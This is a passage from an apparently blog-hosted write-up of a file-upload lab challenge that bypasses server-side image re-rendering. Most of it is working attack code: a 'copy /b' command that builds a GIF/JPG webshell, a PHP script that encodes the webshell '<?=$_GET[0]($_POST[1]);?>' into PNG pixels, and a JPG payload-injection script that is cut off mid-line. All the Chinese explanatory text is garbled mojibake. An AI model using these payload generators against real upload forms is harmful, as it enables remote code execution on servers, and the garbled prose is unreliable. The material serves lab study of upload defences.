class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>è¿™é“é¢˜ä½¿ç”¨çš„æ˜¯å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ï¼š<code>$im = imagecreatefromjpeg($target_path);</code>è¯¥å‡½æ•°æ¥å—å•ä¸ªå‚æ•°<code>$filename</code>ï¼Œè¯¥å‚æ•°ä¿å­˜å›¾åƒçš„åç§°ã€‚è¿”å›å€¼ï¼šæˆåŠŸæ—¶æ­¤å‡½æ•°è¿”å›å›¾åƒèµ„æºæ ‡è¯†ç¬¦ï¼Œé”™è¯¯æ—¶è¿”å›<code>FALSE</code>ã€‚<br>é¦–å…ˆå…ˆä¸Šä¼ ä¸€ä¸ªåŸºç¡€å›¾ç‰‡ï¼Œä¸Šä¼ ä¹‹åå¾—åˆ°çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼ˆæ‹–å‡ºæ¥ï¼‰ï¼Œç„¶åå‡†å¤‡ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶åˆ¶<br>ä½œå›¾ç‰‡é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy  two-pass_rendering.jpg /b + webshell.php /a  muma.jpg</span><br></pre></td></tr></table></figure><p>å…¶ä¸­/bä»£è¡¨äºŒè¿›åˆ¶æ–‡ä»¶binaryï¼Œæ”¾åœ¨å›¾ç‰‡åé¢ï¼Œ/aä»£è¡¨æ–‡å­—æ–‡ä»¶ascii<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673795643512-aeb192d4-a2ef-4a48-8579-807ce70a5b7d.png" alt="62eaa9b1448ffa349f6023a08923ab5.png"><br>ç”Ÿæˆä¹‹åä¸Šä¼ ï¼Œæµ‹è¯•è¿æ¥ï¼Œä½†æ˜¯å‘ç°æ— æ³•è¿æ¥ï¼ŒæŠŠå›¾ç‰‡ç”¨æ–‡æœ¬å½¢å¼æ‰“å¼€åå‘ç°phpè¯­å¥æ ¼å¼å‰é¢æœ‰ç¼ºå¤±ï¼ˆç¼ºå°‘äº†<code>&lt;</code>ï¼‰ï¼Œæ‰€ä»¥åœ¨webshellæ–‡ä»¶å‰é¢éšä¾¿åŠ ä¸Šä¸€ç‚¹å­—ç¬¦ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796220390-17042861-ee9a-49df-9b1f-081543b12e33.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796269910-ddbfd283-518b-4f3b-aa63-039cae915393.png" alt="image.png"><br>é‡æ–°åˆæˆï¼Œå‘ç°è¿™æ¬¡æ ¼å¼ä¸ç¼ºå¤±äº†ï¼Œä½†æ˜¯è¿™æ ·ä¼ ä¸Šå»ä¹‹åè¿˜æ˜¯ä¸è¡Œï¼ŒæŸ¥é˜…èµ„æ–™å‘ç°ï¼Œ<code>.jpg</code>æ–‡ä»¶å’Œ<code>.gif</code>ä¸åŒï¼Œå‰è€…æ¸²æŸ“çš„æ–¹å¼å’Œåè€…æ¸²æŸ“çš„æ–¹å¼ä¸åŒï¼Œå› æ­¤é€‰æ‹©gifæ–‡ä»¶çš„æ“ä½œéš¾åº¦æ›´ä½ã€‚<br>ç›¸åŒæ­¥éª¤é‡æ–°æ“ä½œgifæ–‡ä»¶ï¼Œåˆæˆä¹‹åä¸Šä¼ ï¼Œè¿æ¥å‘ç°æˆåŠŸã€‚</p><h2 id="æ–¹æ³•äºŒ-1"><a href="#æ–¹æ³•äºŒ-1" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ªpngå›¾ç‰‡ï¼Œå¾—åˆ°äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼Œç”¨010ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶äºŒè¿›åˆ¶ç¼–ç ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807266042-10a77bfa-5273-4d5b-b77e-90108045a054.png" alt="image.png"><br>çº¢è‰²çš„æ˜¯ä¸åŒçš„ï¼Œç™½è‰²çš„æ˜¯ç›¸åŒçš„ï¼Œå› æ­¤å¯ä»¥å°†ä¸€å¥è¯æœ¨é©¬å†™åœ¨ç™½è‰²ä½ç½®ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807548864-217eebd6-c513-4f93-88ad-db8b78867018.png" alt="image.png"><br>ç„¶åä¸Šä¼ è¿æ¥</p><h2 id="æ–¹æ³•ä¸‰ï¼ˆå°è¯•ï¼‰"><a href="#æ–¹æ³•ä¸‰ï¼ˆå°è¯•ï¼‰" class="headerlink" title="æ–¹æ³•ä¸‰ï¼ˆå°è¯•ï¼‰"></a>æ–¹æ³•ä¸‰ï¼ˆå°è¯•ï¼‰</h2><p>å¯ä»¥ä¸Šä¼ ä¸€pngç»“å°¾çš„ jpgå›¾ç‰‡</p><h2 id="png-jpg-å›¾ç‰‡é©¬åˆ¶ä½œ"><a href="#png-jpg-å›¾ç‰‡é©¬åˆ¶ä½œ" class="headerlink" title="png jpg å›¾ç‰‡é©¬åˆ¶ä½œ"></a>png jpg å›¾ç‰‡é©¬åˆ¶ä½œ</h2><p>å¦‚æœæƒ³ä½¿ç”¨<code>.png</code>æ–‡ä»¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ç”Ÿæˆå›¾ç‰‡ï¼šï¼ˆè¿™ä¸ªä»£ç å¥½åƒåœ¨php8ç‰ˆæœ¬ä¼šæŠ¥é”™ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆä¹‹åå¾—åˆ°çš„ä¸€å¥è¯æœ¨é©¬ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$_GET</span>[<span class="number">0</span>](<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¦‚ä¸‹ä½¿ç”¨ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673872967604-c93e3422-8a31-4184-a1b5-35eae3f284e8.png" alt="image.png"><br>å¦‚æœæƒ³ä½¿ç”¨<code>jpg</code>æ–‡ä»¶ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼šï¼ˆä½†æ˜¯ç”±äºjpgæ–‡ä»¶å®¹æ˜“æŸåï¼Œå› æ­¤å¯èƒ½éœ€è¦å¤šæ¬¡ç”Ÿæˆï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span 